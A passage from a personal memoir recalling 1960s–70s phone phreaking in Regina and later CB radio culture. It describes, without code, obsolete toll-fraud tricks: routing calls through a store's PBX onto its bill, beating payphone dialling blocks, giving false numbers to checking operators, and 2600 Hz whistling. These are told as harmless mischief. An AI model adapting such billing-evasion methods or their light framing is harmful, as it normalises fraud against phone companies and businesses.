were very low because their range was intended for a local community,
many of whom ceased broadcast at sunset.  Also, I was fascinated by
the fact that one could hear three out of four Regina stations from
as far away as Jackson Wyoming, among other places in the Northwest
we went on our beloved summer vacations (visual reference: cliche
black and white film footage of pipe smoking professor with wife and
little girl with ribbons and little boy with brushcut watching
Yellowstone bears walking up to cars circa 1964 - Go Yogi!).

  Radio remained a big part of my scope of interest to this day (to
which I will later make reference, as this article is taking a
chronological path), but nothing captivated my interest more than did
the telephone!

I was constantly picking it up and twisting the rotary dial to hear
what sound would hit my ear, many with fascination, a few with utter
terror (the siren like "no such circuit" signal made me think I had
done the electronic equivalent of pulling a fire alarm pull station
and that I was going to be in deep doo doo!).  I'm also sure that
operators at the local telephone office cringed at the sound of my
incoherent babbling, as their directives prevented them from saying
what they wanted to say (I'm sure they never had a "hacker" in their
midst and likely had little or no training as how to deal with
such).   However, nothing really impacted those around me regarding
the phone until the day a family friend told me the number that would
make the phone ring.  This, I believe, caused my father to disown
this man as a friend!  The constant ringing to have nothing but what
sounded like Mr. Buzz (nickname for dial tone which I will come to
later) be present annoyed everyone in my household and those whose
houses I regularly invaded (more to come on this topic, as well!).

   Of all the sounds that I had heard when playing with systematic
trials with digit by digit searches there were two that puzzled me to
no end.   If one dialed 115 or 116 from Regina's central or old
northside exchanges a sound resembling a fog horn, sometimes rising
in pitch from start, would be heard.   A year or two went by.  One
Saturday, my parents had something to do and decided I was able to
take their charge card downtown to buy some needed clothing.  After
getting what it was I needed I asked the clerk if I could use the
phone to call my parents to tell them what was happening (I did that
a lot when I was out-mostly to hear the clicks and clunks from the
phone switches) and that I was on my way home.  The clerk told me,
"Dial nine to get out!".  What did I hear when I picked up the
phone?  The foghorn!  To use 21st century geek speak, I had 0wn3d a
PBX and didn't even know it!  A little experimentation led me to
conclude the circuits 115 and 116 were meant as an intercorporate
connection between the PBXes of Simpsons-Sears Limited (formerly The
Robert Simpson Company Limited) and The new Robert Simpson Company
Limited (formerly R. H. Williams and Sons Department Store), as
office staff and customer accounts were in common.

   Now, the fun was about to begin.  After a few times of getting a
fast busy foghorn when dialing a nine I received a pause, a click,
and a dial tone which was that of the downtown central office (had I
lived on the downtown exchange I might have dismissed it as having
received my own dial tone back, but this was not my own (our exchange
had a different pitch and ring style))!  This made tinkering with 1+
7 digits or 1+ 10 digits safer to play with since someone's picking
up the receiver or something causing toll supervision would land on
Simpsons' bill, not our own, and with the multitude of long distance
calls made from that switchboard in the course of daily business (the
"9" only worked during business or store hours) who is going to
notice a few extra short calls here and there?!  Everywhere I'd ever
been in my life and played with a phone in addition to anywhere from
where I'd be able to receive a radio station was now my ever-so-small
world!  My lust for virtual presence was being satisfied.

   Playing with payphones, especially those in smaller towns that
didn't require a dime to be deposited until a party answered, was a
constant for me.  What was most interesting was the fact that when a
long distance call was attempted on a payphone in a city such as
Regina or Lethbridge, it was met with a fast busy signal on any digit
other than "1" as a second digit, thus completely prohibiting the
dialing of long distance calls from payphones (there were no billing
processes in those days and calls had to be placed by dialing "0" for
the telephone operator and depositing coins as instructed).  However,
if a long distance call was dialed through the 115 PBX no supervision
to the payphone would occur, thus refunding the dime deposited to
allow the payphone to operate (urban payphones were useless in an
emergency because they required a coin to get the dial tone or enable
operation of the dial (more on the variations of this later)).  Local
calls or calls to internal extensions supervised and made the
payphone collect the coin deposited.  This made pranking to local
numbers from a payphone completely unattractive.  Thus, random calls
for nothing more than childish amusement (I am ten through seventeen
years of age during these escapades) went to toll numbers.  My aim
was that these would be done to no one's actual expense.  Needless to
say, these random calls to various places in Saskatchewan, Alberta,
BC, Washington, Idaho, Montana, and Wyoming, as well as the odd call
to places elsewhere, increased in number, duration, and inevitably,
left a pattern.

   During this same period my discovery of payphone loopholes had
another scheme for getting a call through without operator
intervention or coin deposit.  Many small towns used "112" as the
access code for dialing long distance calls.  To prevent this from a
payphone, an extra "1" was injected so the operator would be
connected to inform the caller that direct dialing from a payphone
was not available and that the call needed to be placed with the
operator by dialing "0".   If the pulses of the "2" in the "112" were
received quickly enough after the previous "1" the injected "1" would
be missed by the switch in the toll center ("111" was operator, "112"
was DDD access, "113" was information, "114" was repair, the others
generally unused).  This allowed seven or ten digits to follow.
There was another obstacle to overcome.  When a payphone initiated
connection was made to a circuit in the toll center a tone resembling
the local dial tone (slight variation in pitch sometimes) would be
sent upon toll supervision by the local switch to enable the operator
that the call was originating from a payphone so that the operator
could inform the caller that DDD access was not allowed or that the
"0" had been dialed from a payphone.  Until ANI was universally
implemented checking operators would come in to ask the caller for
the number being called from and release the caller into the call.
This operator did not have the line holding power that the "0"
operator had but would deny to release the call if a payphone
indication tone was heard.  For some reason, switches in Saskatchewan
and Alberta would supervise when the switch had received the last
digit dialed rather then when the checking operator picked up to
obtain the caller's number.  At busy times this led to the operator
not hearing the payphone indication tone and asking for the number
routinely.  Provided a number that was not a payphone assigned
number, the operator would enter whatever number the caller gave
without question.  This provided great opportunity to complete calls
without the inconvenience of having to pay.

   Needless to say, every bubble gets bursted, or busted, and the
one bursting the bubble is usually one with a sharp nose, long tail,
and goes by a name Beatrix Potter readers will fondly remember,
Samuel Whiskers, or in other words, a RAT!  Although my world was
small and it never occurred to me that "normal" people's world is
still quite vast, and that a twelve year old from Regina phoning
Lethbridge to talk to another kid whom he met while on summer
vacation was not typical.  My peril was saying who I was.  This
overprotective do-gooder phoned my aunt, my parents, AGT, and the
police!   Another such mother told a phone company representative
that I had called their place long distance.  (Visualization: Brown
matter hitting oscillating blades!)

   The consequences that followed were surprisingly minor.  The
payphone call to the friend was moved to my parents' phone bill, 55
cents, the actual cost of the call.   The calls through the Simpsons
PBX had a charge account entry item on my parents' Simpsons Store
Charge-A-Plate for $200.00 with a hand written entry, "Direct Dialed
Calls"!  This was like a administrative charge issued to my sister 20
years later when my nephew was caught shoplifting from Zellers.

   Over the years that followed I found a few nice "features" of the
switches used to complete long distance calls.  One such item was
that depressing the switch hook at the precise moment would cause the
ANI to fail and a checking operator would come online to ask for the
caller's number and then release the call.  This is something that
would have been handy to keep all those calls from landing on
Simpsons' bill, maybe delaying that loophole's demise.  Having been
bitten by giving no-serviced numbers to checking operators this had
to have a different advantage.  This led to an experiment.  If a
number is dialed and then that number was given to the checking
operator it would release.  I have been forever curious how this
would be interpreted by the billing system.  There would be a
destination and a duration, but there would be no way to determine a
charge since there would have to be an originating point to calculate
a rate to charge for the call.  This loophole remained for nearly
eight years before the switch in Regina's toll switching center would
refuse a number local to the destination number to the checking
operator.  Places elsewhere had plugged up this hole much earlier.

   The publication of an article, "Hello World! - Tricks with a
little black box"  brought on a whole new meaning to the tinkering
with the telephone.  This article told the story of Captain Crunch
and the building of devices that led to an underground movement of
"Phreakers" .  The cover read, "Why Phone Freaks don't get phone
bills - They use a little black box.  It's illegal, naturally!".  The
article described that the 2600 hertz tone was closest to High E on
the piano keyboard, and having a piano in my house, it was no time at
all until I was tuned to this pitch.  Given that I did not have a
blue box, as described in great detail, I experimented greatly with
whistling, and did so cautiously, as the article described a
situation where someone was busted for whistling.  I made a Blue Box
with my first home computer in later years, and tested it, but never
went hog wild with it, mainly out of fear of being busted.

   In the time of discovering the article, there was a story about a
place where phreakers met online.  There was a circuit in Vancouver
BC that allowed anyone who keyed in (or pulsed in 2600hz bursts) 604
2111 to be connected in a conference, in this reference, a "loop".
This was closed down by the authorities but I was determined to find
another.  I noticed that the directory assistance number
(1-604-555-1212) started supervising, which made phreaking less risky
(the article had pointed out that the 555 number was risky because a
supervision on an unsupervised line would raise a red flag).  I
played around to find that 121 would reach an inward operator that
would dial any number that the toll center covered and 131 would
reach directory assistance.  It was an attempt to find a way to
connect to elsewhere that I discovered a non-supervisory recording
that endlessly described the coin deposit jingles in payphones, "five
cents, ding! ten cents, ding-ding! twenty-five cents, dong! five
cents, ding ...), being the strangest recording I ever heard to this
day!

  Technology brought other delights, as well!  During the sixties I
sent away for electronics catalogs from such places as Heathkit, or
Allied Electronics.  This led me to discover the poor man's mobile
telephone, the Citizen's Band Radio!  Early models ranged in power
from forty milliwatts in children's walkie-talkies to twelve watts in
Single Sideband equipped units.  Many models had one, two, six, or
twelve selected channels, using individual crystals to twenty-three,
and later forty channels.  This was an inexpensive means of
communication for local communication for a variety of purposes.
This brought forth a revenue means for the government.  Every unit
with an input-to-antenna power of greater than 100 milliwatts had to
be licensed by the federal governments of Canada and the US.  This
brought forth a subculture.  Persons who engaged in "a diversionary
or recreational activity", or communicated with those "beyond the
ground wave coverage of the station", both prohibited uses of the
service brought forth as a means of preventing congestion of the
airwaves, proliferated in great numbers, especially in the mid to
late seventies.  Some operators even increased their base input
power, using what were known as linear amplifiers, as well as
operated outside the allocated frequency range specified by the FCC
(or Canadian Department of Communications).  The latter two
violations led to prosecutions brought forth by the feds.  It seemed
that the intent was to act upon complaints (mostly interference to
broadcast radio and television reception), but some jurisdictions had
officers with greater bones to pick.

   Regulations of the day stated that one used one's licensed call
sign to call another.  In a circle of pioneer operators it was
customary to know each other by name and call letters.  Most evenings
a net call was conducted to ensure that the local operators were
available for emergencies or other situations requiring a group
effort.  As communities grew there became distinct groups of
operators, most of whom formed associations or clubs, in which a
variety of events and activities were held.  There even became rival
groups, forming constitutions that worked to exclude members of the
rival group.  Two such activities that were commonplace around
America were Jamborees (a campout of CBers, mainly an excuse to drink
heavily en masse) and Bunny Hunts (a strategic game of Hide-and-Seek
using a hidden radio operator).  However, nothing contributed to the
population explosion more than the music industry!  In 1975 a pop/
country song named "Convoy" by C. W. McCall hit the airwaves.  It
seemed that after that, every kid had a radio and the means to
identify oneself was by using a pseudonym, or "handle" and flocked to
channel nineteen (the most commonly used channel by semi drivers
along North America's highways), just to use the customary
announcement that one was going to call by pressing the transmit
button and yelling, "Breaker One Nine!", and awaiting a response, "Go
Break!" before proceeding to call another unit by their handle.
Often, so many would try calling at once (sometimes because those
whose signals they collided were beyond earshot due to distance or
the fact that the squelch control on the radio unit was set too high
so only a nearby signal would break through) that one could not
understand a single word through a collision of signals.

   There was no greater a collision of transmitted signals than that
of the ionispheric reflection of signals that routinely occurred at
varying times of the day and night, mostly daytime during winter
months.  Local communication became next to impossible but this
phenomenon allowed one to communicate (even with low power or small
antenna setup) with units several hundreds of miles away.  This
proved to be more fun than any of the other aspects of these
technologies.  This made the world smaller and made for hour of
collecting contacts, all in hope of reaching someone in a foreign
country somewhere, while having constant contact with many very
accented folks in the deep South.  Conditions occasionally permitted
contact with unit remarkably close, and in some cases, that one often
made a land line long distance call to verify the location of the
contact whose signal was so clear it could have been someone nearby
pretending to be far away.
